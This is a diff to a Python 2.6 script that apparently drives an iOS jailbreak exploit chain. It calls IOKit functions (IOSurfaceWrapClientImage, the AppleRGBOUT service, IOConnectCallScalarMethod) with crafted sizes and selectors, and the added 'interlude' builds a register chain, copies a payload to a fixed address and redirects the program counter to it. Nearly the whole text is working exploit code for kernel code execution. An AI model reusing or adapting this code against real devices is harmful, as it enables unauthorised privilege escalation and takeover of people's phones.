@@ -1,9 +1,11 @@
 #!/opt/local/bin/python2.6
-import sys, base64, shlex, zlib
+import sys, base64, shlex, zlib, os
 import dmini
 from world1 import *
 import goo
 import cPickle as pickle
+
+four_dot_three = '4.3' in os.environ['VERSION']
 
 if len(sys.argv) != 5:
     print >> sys.stderr, "usage: python catalog.py dejavu|two cache kern patchfile"
@@ -21,8 +23,7 @@ def read(f, size):
     return result
 
 def dbg_result():
-    # ensure that all of these are 0!
-    if False:
+    if True:
         result, resultp = stackunkpair()
         store_r0_to(resultp)
         back = sys._getframe().f_back
@@ -115,9 +116,8 @@ if mode == 'dejavu':
     memory_entry, memory_entryp = stackunkpair()
     funcall('_mach_make_memory_entry', None, sizep, 0x1000, 5, memory_entryp, 0); dbg_result()
 
-kptr = ptr(kstuff)
-
-w, h = 1, kptr + 4
+kstart = pointed('')
+w, h = 1, kstart
 funcall('_IOSurfaceWrapClientImage', 0x41424752, w, h, 4, 4*w*h, 0)
 dbg_result(); funcall('_abort')
 surface, surfacep = stackunkpair()
@@ -130,18 +130,26 @@ if mode == 'two':
     # XXX is this necessary? it's from star
     funcall('_IOKitWaitQuiet', 0, ptrI(0, 0, 0))
 
-# XXX
 funcall('_IOServiceMatching', ptr('AppleRGBOUT', True))
 connect = ptrI(0)
 funcall('_IOServiceOpen', None, mtss.pop(), 0, connect); dbg_result()
-js = ptrI(surface_id, 0, 6, 0)
+js = ptrI(surface_id, 0, 9 if four_dot_three else 8, 0)
 funcall('_IOConnectCallScalarMethod', connect, 1, js, 2, 0, 0, load_r0=True)
+
+# now an interlude
+clear_fwd()
+heapadd(fwd('R4'), fwd('R5'), fwd('R6'), kstart, fwd('R7'), fwd('PC'))
+code_addr = 0x80000400 # xxx
+funcall('_memcpy', code_addr, ptr(weirdfile), len(weirdfile))
+set_fwd('PC', code_addr)
+clear_fwd()
+
 
 # do some housekeeping
 # (but don't bother if we're going to exec)
 if mode == 'dejavu':
     funcall('_CFRelease', surface)
-    funcall('_IOSurfaceClose', connect, load_r0=True)
+    funcall('_IOServiceClose', connect, load_r0=True)
 
     # the boring stuff
 
